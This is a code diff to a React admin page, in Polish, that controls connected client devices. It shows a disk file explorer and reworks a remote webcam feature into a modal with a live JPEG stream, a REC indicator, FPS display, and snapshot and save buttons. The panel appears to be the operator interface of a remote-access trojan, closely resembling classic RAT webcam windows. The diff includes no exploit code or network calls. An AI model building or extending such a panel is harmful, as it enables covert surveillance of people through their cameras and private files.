@@ -4,6 +4,7 @@ import { useState, useEffect } from 'react';
 export default function AdminPage() {
   const [clients, setClients] = useState<any[]>([]);
   const [msgInput, setMsgInput] = useState<{ [key: string]: string }>({});
+  const [activeCameraId, setActiveCameraId] = useState<string | null>(null);
 
   const fetchClients = async () => {
     try {
@@ -43,7 +44,6 @@ export default function AdminPage() {
           message: currentlyCapturing ? "CAMERA:STOP" : "CAMERA:START"
         })
       });
-      // Toggle local state to update the UI instantly (but server logic does the heavy lifting).
       setClients(clients.map(c => c.id === id ? { ...c, isCameraActive: !currentlyCapturing } : c));
     } catch (e) {
       console.error(e);
@@ -136,12 +136,8 @@ export default function AdminPage() {
                     </div>
                   )}
 
-                  {/* File Explorer Section */}
                   <div style={{ marginTop: "1rem", paddingTop: "1rem", borderTop: "1px solid rgba(255,255,255,0.1)" }}>
                     <h4 style={{ color: "#f8fafc", marginBottom: "0.5rem" }}>Eksplorator Plików</h4>
-                    <p style={{ color: "#94a3b8", fontSize: "0.9rem", marginBottom: "1rem" }}>
-                        Otwórz menedżera plików dla tego urządzenia aby przeglądać zawartość dysku, podobnie jak w systemie Windows.
-                    </p>
                     <button 
                         onClick={() => window.location.href = `/explorer/${client.id}`}
                         style={{ 
@@ -162,39 +158,24 @@ export default function AdminPage() {
                         📂 Otwórz Menedżer Plików
                     </button>
                     
-                    {/* Camera Control Section */}
                     <button 
-                        onClick={() => toggleCamera(client.id, client.isCameraActive)}
+                        onClick={() => setActiveCameraId(client.id)}
                         style={{ 
                           width: "100%",
                           marginTop: "10px",
                           padding: "0.8rem 1rem", 
                           borderRadius: "4px", 
                           border: "none",
-                          background: client.isCameraActive ? "#ef4444" : "#f59e0b",
+                          background: "#4f46e5",
                           color: "white",
                           fontWeight: "bold",
                           cursor: "pointer",
-                          boxShadow: "0 4px 15px rgba(245, 158, 11, 0.4)",
+                          boxShadow: "0 4px 15px rgba(79, 70, 229, 0.4)",
                           transition: "background 0.2s"
                         }}
                     >
-                        {client.isCameraActive ? "⏹️ Wyłącz Kamere" : "📹 Włącz Kamere"}
+                        📹 Otwórz panel Kamery
                     </button>
-                    
-                    {client.isCameraActive && client.cameraData && (
-                        <div style={{ marginTop: "15px", borderRadius: "6px", overflow: "hidden", backgroundColor: "#000" }}>
-                            <div style={{ padding: "4px 8px", background: "#333", color: "white", fontSize: "11px", display: "flex", justifyContent: "space-between" }}>
-                                <span>Podgląd na żywo ({client.id})</span>
-                                <span style={{ color: "red", fontWeight: "bold" }}>● REC</span>
-                            </div>
-                            <img 
-                                src={`data:image/jpeg;base64,${client.cameraData}`} 
-                                alt="Kamera na żywo" 
-                                style={{ width: "100%", height: "auto", display: "block" }} 
-                            />
-                        </div>
-                    )}
                   </div>
                 </div>
               </div>
@@ -202,6 +183,103 @@ export default function AdminPage() {
           )}
         </div>
       </div>
+
+      {activeCameraId && (() => {
+        const camClient = clients.find(c => c.id === activeCameraId);
+        if (!camClient) return null;
+        
+        return (
+          <div style={{
+            position: "fixed", top: 0, left: 0, width: "100vw", height: "100vh",
+            backgroundColor: "rgba(0,0,0,0.8)", zIndex: 9999, display: "flex", justifyContent: "center", alignItems: "center"
+          }}>
+            <div style={{
+              width: "870px", backgroundColor: "#f5f5f5", borderRadius: "8px", overflow: "hidden", 
+              boxShadow: "0 10px 40px rgba(0,0,0,0.5)", fontFamily: "Segoe UI, sans-serif", color: "#333"
+            }}>
+              <div style={{ backgroundColor: "#e0e0e0", padding: "8px 12px", borderBottom: "1px solid #ccc", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
+                <span style={{ fontWeight: "bold", fontSize: "14px" }}>WebCam - Remote Camera ({camClient.id})</span>
+                <button onClick={() => setActiveCameraId(null)} style={{ background: "transparent", border: "none", fontSize: "16px", cursor: "pointer", color: "#666" }}>✖</button>
+              </div>
+
+              <div style={{ display: "flex", padding: "12px", gap: "12px", height: "480px" }}>
+                <div style={{ flex: 1, backgroundColor: "black", border: "1px solid #ccc", position: "relative", display: "flex", alignItems: "center", justifyContent: "center" }}>
+                  {camClient.isCameraActive ? (
+                    camClient.cameraData ? (
+                      <img src={`data:image/jpeg;base64,${camClient.cameraData}`} alt="Video Stream" style={{ width: "100%", height: "100%", objectFit: "contain" }} />
+                    ) : (
+                      <span style={{ color: "white" }}>Oczekiwanie na klatki...</span>
+                    )
+                  ) : (
+                    <span style={{ color: "gray" }}>Kamera wyłączona</span>
+                  )}
+                  {camClient.isCameraActive && (
+                    <div style={{ position: "absolute", top: 10, right: 10, backgroundColor: "rgba(255,0,0,0.7)", color: "white", padding: "2px 6px", borderRadius: "4px", fontSize: "12px", fontWeight: "bold" }}>● REC</div>
+                  )}
+                </div>
+
+                <div style={{ width: "200px", display: "flex", flexDirection: "column", gap: "10px" }}>
+                  <div style={{ border: "1px solid #ccc", padding: "10px", borderRadius: "4px", backgroundColor: "white" }}>
+                    <div style={{ fontSize: "12px", color: "#666", marginBottom: "8px" }}>📹 Kamera</div>
+                    <label style={{ fontSize: "11px", display: "block" }}>Wybierz:</label>
+                    <div style={{ display: "flex", gap: "5px", marginTop: "4px" }}>
+                      <select style={{ flex: 1, padding: "2px" }} disabled><option>Domyślna Kamera</option></select>
+                      <button style={{ padding: "2px 6px", cursor: "pointer" }}>🔄</button>
+                    </div>
+                  </div>
+
+                  <div style={{ border: "1px solid #ccc", padding: "10px", borderRadius: "4px", backgroundColor: "white" }}>
+                    <div style={{ fontSize: "12px", color: "#666", marginBottom: "8px" }}>🎚️ Jakość</div>
+                    <label style={{ fontSize: "11px", display: "block" }}>Jakość JPEG:</label>
+                    <select style={{ width: "100%", marginTop: "4px", padding: "2px" }} disabled>
+                      <option>Wysoka (High)</option>
+                    </select>
+                  </div>
+
+                  <div style={{ border: "1px solid #ccc", padding: "10px", borderRadius: "4px", backgroundColor: "white", flex: 1 }}>
+                    <div style={{ fontSize: "12px", color: "#666", marginBottom: "8px" }}>⚡ Akcje</div>
+                    <button 
+                      onClick={() => toggleCamera(camClient.id, camClient.isCameraActive)}
+                      style={{ width: "100%", padding: "8px", marginBottom: "8px", backgroundColor: camClient.isCameraActive ? "#ef4444" : "#22c55e", color: "white", border: "none", borderRadius: "2px", fontWeight: "bold", cursor: "pointer" }}
+                    >
+                      {camClient.isCameraActive ? "⏹ Stop" : "▶️ Start"}
+                    </button>
+                    <button 
+                      onClick={() => {
+                        if(camClient.cameraData) {
+                          const w = window.open("");
+                          w?.document.write(`<img src="data:image/jpeg;base64,${camClient.cameraData}" />`);
+                        }
+                      }}
+                      style={{ width: "100%", padding: "8px", marginBottom: "8px", backgroundColor: "#f97316", color: "white", border: "none", borderRadius: "2px", fontWeight: "bold", cursor: "pointer" }}
+                    >
+                      📷 Zrób zdjęcie
+                    </button>
+                    <button 
+                      onClick={() => {
+                        if(camClient.cameraData) {
+                          const a = document.createElement("a");
+                          a.href = `data:image/jpeg;base64,${camClient.cameraData}`;
+                          a.download = `camera_capture_${camClient.id}_${Date.now()}.jpg`;
+                          a.click();
+                        }
+                      }}
+                      style={{ width: "100%", padding: "8px", backgroundColor: "#0ea5e9", color: "white", border: "none", borderRadius: "2px", fontWeight: "bold", cursor: "pointer" }}
+                    >
+                      💾 Zapisz obraz
+                    </button>
+                  </div>
+                </div>
+              </div>
+
+              <div style={{ backgroundColor: "#404040", color: "white", padding: "4px 10px", display: "flex", justifyContent: "space-between", fontSize: "11px" }}>
+                <span>{camClient.isCameraActive ? "Odbieranie klatek..." : "Gotowy"}</span>
+                <span>FPS: {camClient.isCameraActive && camClient.cameraData ? "~15" : "0"}</span>
+              </div>
+            </div>
+          </div>
+        );
+      })()}
     </div>
   );
 }
